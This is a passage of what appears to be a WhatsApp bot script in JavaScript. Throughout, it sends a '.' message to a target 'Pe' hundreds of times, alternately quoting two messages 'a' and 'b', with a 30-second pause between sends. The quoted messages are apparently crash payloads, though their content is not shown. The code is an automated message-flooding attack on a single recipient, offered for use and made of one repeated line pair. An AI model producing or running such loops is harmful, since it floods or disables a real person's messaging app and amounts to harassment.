                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
